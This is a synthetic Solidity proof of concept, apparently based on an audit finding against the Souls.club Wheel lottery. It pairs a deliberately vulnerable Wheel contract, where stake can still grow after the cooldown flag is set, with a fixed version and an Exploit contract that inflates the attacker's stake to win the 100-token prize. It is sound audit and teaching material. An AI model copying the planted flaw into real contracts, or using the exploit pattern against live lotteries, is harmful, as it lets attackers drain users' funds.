// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Souls.club Wheel — stake can still grow after the cooldown flag is set
    (Shieldify, Souls.club Wheel, November 2025).
    SYNTHETIC, cheatcode-free, one block. Cooldown is a flag, not a warp.
    Victim stake 100, attacker stake 1, roll 50. The attacker is walked
    first, so roll 50 misses them. During cooldown they add 1,000. Roll 50
    now hits them and they take the 100 PRIZE they should not win.
    Control rejects the extra stake. The same roll pays the victim. */

contract Prize {
    string public constant name = "PRIZE";
    string public constant symbol = "PRIZE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Wheel {
    Prize public prize;
    address public attacker;
    address public victim;
    uint256 public stakeA;
    uint256 public stakeV;
    bool public cooldown;
    uint256 public constant ROLL = 50;
    address public winner;

    constructor(Prize prize_, address attacker_, address victim_) {
        prize = prize_;
        attacker = attacker_;
        victim = victim_;
    }

    function join(address who, uint256 amount) external {
        if (who == attacker) {
            stakeA += amount;
        } else {
            stakeV += amount;
        }
        if (stakeA > 0 && stakeV > 0) {
            cooldown = true;
        }
    }

    function joinDuringCooldown(uint256 amount) external {
        require(cooldown, "cooldown");
        // @> VULN: cooldown is already set and the attacker stake still grows
        stakeA += amount;
    }

    function spin() external {
        address who = ROLL < stakeA ? attacker : victim;
        winner = who;
        if (who == attacker) {
            prize.transfer(attacker, 100 ether);
        }
    }
}

contract WheelFixed {
    Prize public prize;
    address public attacker;
    address public victim;
    uint256 public stakeA;
    uint256 public stakeV;
    bool public cooldown;
    uint256 public constant ROLL = 50;
    address public winner;

    constructor(Prize prize_, address attacker_, address victim_) {
        prize = prize_;
        attacker = attacker_;
        victim = victim_;
    }

    function join(address who, uint256 amount) external {
        if (who == attacker) stakeA += amount;
        else stakeV += amount;
        if (stakeA > 0 && stakeV > 0) cooldown = true;
    }

    function joinDuringCooldown(uint256 amount) external {
        require(cooldown, "cooldown");
        amount;
        revert("frozen");
    }

    function spin() external {
        address who = ROLL < stakeA ? attacker : victim;
        winner = who;
        if (who == attacker) prize.transfer(attacker, 100 ether);
    }
}

contract Exploit {
    Prize public prize;
    Wheel public wheel;
    uint256 public won;

    constructor() {
        prize = new Prize();
        wheel = new Wheel(prize, address(this), address(0xBEEF));
    }

    function run() external {
        prize.mint(address(wheel), 100 ether);
        wheel.join(address(this), 1);
        wheel.join(address(0xBEEF), 100);
        require(wheel.cooldown(), "flag");
        wheel.joinDuringCooldown(1000);
        wheel.spin();
        won = prize.balanceOf(address(this));
        require(wheel.stakeA() == 1001, "boosted");
        require(wheel.winner() == address(this), "winner");
        require(won == 100 ether, "prize");
    }
}
